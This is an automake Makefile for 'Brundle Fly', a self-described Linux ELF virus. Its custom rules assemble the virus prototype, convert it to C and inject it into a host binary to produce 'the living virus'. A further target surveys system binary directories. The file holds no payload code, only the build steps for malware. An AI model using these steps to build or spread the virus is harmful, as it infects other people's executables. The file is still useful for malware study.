# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake 1.4 from Makefile.am

# Copyright (C) 1994, 1995-8, 1999 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy and/or distribute it,
# with or without modifications, as long as this notice is preserved.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY, to the extent permitted by law; without
# even the implied warranty of MERCHANTABILITY or FITNESS FOR A
# PARTICULAR PURPOSE.

#
# Brundle Fly - Good-natured Linux ELF virus supporting kernel 2.2 and 2.4
# Copyright 2001 Konrad Rieck <kr@roqe.org>, Konrad Kretschmer <kk@roqe.org>
# In memory to Seth Brundle 
#
# This is the automake Makefile. That holds most dependencies and rules 
# to compile Brundle Fly. 
#
# $Id: Makefile.am,v 1.12 2001/07/11 18:34:48 kr Exp $
#


SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr/local
exec_prefix = ${prefix}

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
libexecdir = ${exec_prefix}/libexec
datadir = ${prefix}/share
sysconfdir = ${prefix}/etc
sharedstatedir = ${prefix}/com
localstatedir = ${prefix}/var
libdir = ${exec_prefix}/lib
infodir = ${prefix}/info
mandir = ${prefix}/man
includedir = ${prefix}/include
oldincludedir = /usr/include

DESTDIR =

pkgdatadir = $(datadir)/brundle-fly
pkglibdir = $(libdir)/brundle-fly
pkgincludedir = $(includedir)/brundle-fly

top_builddir = ..

ACLOCAL = /home/zhy/git/malicious-code-conceal/mailcious-code/useful/c_linux/brundle/missing aclocal
AUTOCONF = /home/zhy/git/malicious-code-conceal/mailcious-code/useful/c_linux/brundle/missing autoconf
AUTOMAKE = /home/zhy/git/malicious-code-conceal/mailcious-code/useful/c_linux/brundle/missing automake
AUTOHEADER = /home/zhy/git/malicious-code-conceal/mailcious-code/useful/c_linux/brundle/missing autoheader

INSTALL = /usr/bin/install -c
INSTALL_PROGRAM = ${INSTALL} $(AM_INSTALL_PROGRAM_FLAGS)
INSTALL_DATA = ${INSTALL} -m 644
INSTALL_SCRIPT = ${INSTALL_PROGRAM}
transform = s,x,x,

NORMAL_INSTALL = :
PRE_INSTALL = :
POST_INSTALL = :
NORMAL_UNINSTALL = :
PRE_UNINSTALL = :
POST_UNINSTALL = :
AS = as
CC = gcc
CFLAGS = -g -O2
GCC = yes
LD = ld
MAKEINFO = makeinfo
PACKAGE = brundle-fly
VERSION = 0.0.1

bin_PROGRAMS = elfstat finetune elf2bin host inject brundle-fly
finetune_SOURCES = finetune.c
elf2bin_SOURCES = elf2bin.c elfio.c elfio.h brundle-fly.h
elfstat_SOURCES = elfstat.c elfio.c elfio.h
inject_SOURCES = inject.c elfio.c brundle-fly.c elfio.h brundle-fly.h
host_SOURCES = host.c
EXTRA_DIST = brundle-fly-proto.c structs.h syscalls.h cnthosts

VFLAGS =  -I. -I.. -O1 -fconserve-space -fno-builtin -fomit-frame-pointer -m386 -S
mkinstalldirs = $(SHELL) $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
CONFIG_CLEAN_FILES = 
PROGRAMS =  $(bin_PROGRAMS)


DEFS = -DHAVE_CONFIG_H -I. -I$(srcdir) -I..
CPPFLAGS = 
LDFLAGS = 
LIBS = 
elfstat_OBJECTS =  elfstat.o elfio.o
elfstat_LDADD = $(LDADD)
elfstat_DEPENDENCIES = 
elfstat_LDFLAGS = 
finetune_OBJECTS =  finetune.o
finetune_LDADD = $(LDADD)
finetune_DEPENDENCIES = 
finetune_LDFLAGS = 
elf2bin_OBJECTS =  elf2bin.o elfio.o
elf2bin_LDADD = $(LDADD)
elf2bin_DEPENDENCIES = 
elf2bin_LDFLAGS = 
host_OBJECTS =  host.o
host_LDADD = $(LDADD)
host_DEPENDENCIES = 
host_LDFLAGS = 
inject_OBJECTS =  inject.o elfio.o brundle-fly.o
inject_LDADD = $(LDADD)
inject_DEPENDENCIES = 
inject_LDFLAGS = 
brundle_fly_SOURCES = brundle-fly.c
brundle_fly_OBJECTS =  brundle-fly.o
brundle_fly_LDADD = $(LDADD)
brundle_fly_DEPENDENCIES = 
brundle_fly_LDFLAGS = 
COMPILE = $(CC) $(DEFS) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(AM_CFLAGS) $(CFLAGS)
CCLD = $(CC)
LINK = $(CCLD) $(AM_CFLAGS) $(CFLAGS) $(LDFLAGS) -o $@
DIST_COMMON =  Makefile.am Makefile.in


DISTFILES = $(DIST_COMMON) $(SOURCES) $(HEADERS) $(TEXINFOS) $(EXTRA_DIST)

TAR = tar
GZIP_ENV = --best
SOURCES = $(elfstat_SOURCES) $(finetune_SOURCES) $(elf2bin_SOURCES) $(host_SOURCES) $(inject_SOURCES) brundle-fly.c
OBJECTS = $(elfstat_OBJECTS) $(finetune_OBJECTS) $(elf2bin_OBJECTS) $(host_OBJECTS) $(inject_OBJECTS) brundle-fly.o

all: all-redirect
.SUFFIXES:
.SUFFIXES: .S .c .o .s
$(srcdir)/Makefile.in: Makefile.am $(top_srcdir)/configure.in $(ACLOCAL_M4) 
	cd $(top_srcdir) && $(AUTOMAKE) --gnu --include-deps src/Makefile

Makefile: $(srcdir)/Makefile.in  $(top_builddir)/config.status
	cd $(top_builddir) \
	  && CONFIG_FILES=$(subdir)/$@ CONFIG_HEADERS= $(SHELL) ./config.status


mostlyclean-binPROGRAMS:

clean-binPROGRAMS:
	-test -z "$(bin_PROGRAMS)" || rm -f $(bin_PROGRAMS)

distclean-binPROGRAMS:

maintainer-clean-binPROGRAMS:

install-binPROGRAMS: $(bin_PROGRAMS)
	@$(NORMAL_INSTALL)
	$(mkinstalldirs) $(DESTDIR)$(bindir)
	@list='$(bin_PROGRAMS)'; for p in $$list; do \
	  if test -f $$p; then \
	    echo "  $(INSTALL_PROGRAM) $$p $(DESTDIR)$(bindir)/`echo $$p|sed 's/$(EXEEXT)$$//'|sed '$(transform)'|sed 's/$$/$(EXEEXT)/'`"; \
	     $(INSTALL_PROGRAM) $$p $(DESTDIR)$(bindir)/`echo $$p|sed 's/$(EXEEXT)$$//'|sed '$(transform)'|sed 's/$$/$(EXEEXT)/'`; \
	  else :; fi; \
	done

uninstall-binPROGRAMS:
	@$(NORMAL_UNINSTALL)
	list='$(bin_PROGRAMS)'; for p in $$list; do \
	  rm -f $(DESTDIR)$(bindir)/`echo $$p|sed 's/$(EXEEXT)$$//'|sed '$(transform)'|sed 's/$$/$(EXEEXT)/'`; \
	done

.c.o:
	$(COMPILE) -c $<

.s.o:
	$(COMPILE) -c $<

.S.o:
	$(COMPILE) -c $<

mostlyclean-compile:
	-rm -f *.o core *.core

clean-compile:

distclean-compile:
	-rm -f *.tab.c

maintainer-clean-compile:

elfstat: $(elfstat_OBJECTS) $(elfstat_DEPENDENCIES)
	@rm -f elfstat
	$(LINK) $(elfstat_LDFLAGS) $(elfstat_OBJECTS) $(elfstat_LDADD) $(LIBS)

finetune: $(finetune_OBJECTS) $(finetune_DEPENDENCIES)
	@rm -f finetune
	$(LINK) $(finetune_LDFLAGS) $(finetune_OBJECTS) $(finetune_LDADD) $(LIBS)

elf2bin: $(elf2bin_OBJECTS) $(elf2bin_DEPENDENCIES)
	@rm -f elf2bin
	$(LINK) $(elf2bin_LDFLAGS) $(elf2bin_OBJECTS) $(elf2bin_LDADD) $(LIBS)

host: $(host_OBJECTS) $(host_DEPENDENCIES)
	@rm -f host
	$(LINK) $(host_LDFLAGS) $(host_OBJECTS) $(host_LDADD) $(LIBS)

inject: $(inject_OBJECTS) $(inject_DEPENDENCIES)
	@rm -f inject
	$(LINK) $(inject_LDFLAGS) $(inject_OBJECTS) $(inject_LDADD) $(LIBS)

tags: TAGS

ID: $(HEADERS) $(SOURCES) $(LISP)
	list='$(SOURCES) $(HEADERS)'; \
	unique=`for i in $$list; do echo $$i; done | \
	  awk '    { files[$$0] = 1; } \
	       END { for (i in files) print i; }'`; \
	here=`pwd` && cd $(srcdir) \
	  && mkid -f$$here/ID $$unique $(LISP)

TAGS:  $(HEADERS) $(SOURCES)  $(TAGS_DEPENDENCIES) $(LISP)
	tags=; \
	here=`pwd`; \
	list='$(SOURCES) $(HEADERS)'; \
	unique=`for i in $$list; do echo $$i; done | \
	  awk '    { files[$$0] = 1; } \
	       END { for (i in files) print i; }'`; \
	test -z "$(ETAGS_ARGS)$$unique$(LISP)$$tags" \
	  || (cd $(srcdir) && etags $(ETAGS_ARGS) $$tags  $$unique $(LISP) -o $$here/TAGS)

mostlyclean-tags:

clean-tags:

distclean-tags:
	-rm -f TAGS ID

maintainer-clean-tags:

distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)

subdir = src

distdir: $(DISTFILES)
	@for file in $(DISTFILES); do \
	  d=$(srcdir); \
	  if test -d $$d/$$file; then \
	    cp -pr $$/$$file $(distdir)/$$file; \
	  else \
	    test -f $(distdir)/$$file \
	    || ln $$d/$$file $(distdir)/$$file 2> /dev/null \
	    || cp -p $$d/$$file $(distdir)/$$file || :; \
	  fi; \
	done
brundle-fly.o: brundle-fly.c
elf2bin.o: elf2bin.c ../config.h elfio.h brundle-fly.h
elfio.o: elfio.c ../config.h elfio.h brundle-fly.h
elfstat.o: elfstat.c ../config.h elfio.h
finetune.o: finetune.c
host.o: host.c
inject.o: inject.c ../config.h elfio.h brundle-fly.h

info-am:
info: info-am
dvi-am:
dvi: dvi-am
check-am: all-am
check: check-am
installcheck-am:
installcheck: installcheck-am
install-exec-am: install-binPROGRAMS
install-exec: install-exec-am

install-data-am:
install-data: install-data-am

install-am: all-am
	@$(MAKE) $(AM_MAKEFLAGS) install-exec-am install-data-am
install: install-am
uninstall-am: uninstall-binPROGRAMS
uninstall: uninstall-am
all-am: Makefile $(PROGRAMS)
all-redirect: all-am
install-strip:
	$(MAKE) $(AM_MAKEFLAGS) AM_INSTALL_PROGRAM_FLAGS=-s install
installdirs:
	$(mkinstalldirs)  $(DESTDIR)$(bindir)


mostlyclean-generic:

clean-generic:

distclean-generic:
	-rm -f Makefile $(CONFIG_CLEAN_FILES)
	-rm -f config.cache config.log stamp-h stamp-h[0-9]*

maintainer-clean-generic:
mostlyclean-am:  mostlyclean-binPROGRAMS mostlyclean-compile \
		mostlyclean-tags mostlyclean-generic

mostlyclean: mostlyclean-am

clean-am:  clean-binPROGRAMS clean-compile clean-tags clean-generic \
		mostlyclean-am

clean: clean-am

distclean-am:  distclean-binPROGRAMS distclean-compile distclean-tags \
		distclean-generic clean-am

distclean: distclean-am

maintainer-clean-am:  maintainer-clean-binPROGRAMS \
		maintainer-clean-compile maintainer-clean-tags \
		maintainer-clean-generic distclean-am
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."

maintainer-clean: maintainer-clean-am

.PHONY: mostlyclean-binPROGRAMS distclean-binPROGRAMS clean-binPROGRAMS \
maintainer-clean-binPROGRAMS uninstall-binPROGRAMS install-binPROGRAMS \
mostlyclean-compile distclean-compile clean-compile \
maintainer-clean-compile tags mostlyclean-tags distclean-tags \
clean-tags maintainer-clean-tags distdir info-am info dvi-am dvi check \
check-am installcheck-am installcheck install-exec-am install-exec \
install-data-am install-data install-am install uninstall-am uninstall \
all-redirect all-am all installdirs mostlyclean-generic \
distclean-generic clean-generic maintainer-clean-generic clean \
mostlyclean distclean maintainer-clean


brundle-fly-plain.s: finetune brundle-fly-proto.c structs.h syscalls.h
	$(CC) $(VFLAGS) brundle-fly-proto.c
	./finetune brundle-fly-proto.s brundle-fly-plain.s

brundle-fly.c: elf2bin brundle-fly-plain.s
	$(AS) brundle-fly-plain.s -o brundle-fly-plain.o
	$(LD) brundle-fly-plain.o -o brundle-fly-linked.o
	./elf2bin brundle-fly-linked.o brundle-fly.c

brundle-fly: inject host
	./inject host brundle-fly
	@echo
	@echo "The living virus can be found in the binary \"brundle-fly\"."
	@echo "handle it with care. Execution permissions have been removed"
	@echo

stats: cnthosts inject brundle-fly
	./cnthosts /usr/bin /bin /usr/local/bin /usr/sbin

clean:
	rm -f *.s *.bin brundle-fly.c *~

distclean:
	rm -f *.s *.bin brundle-fly.c *~

beautify:
	indent -kr *.c *.h

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
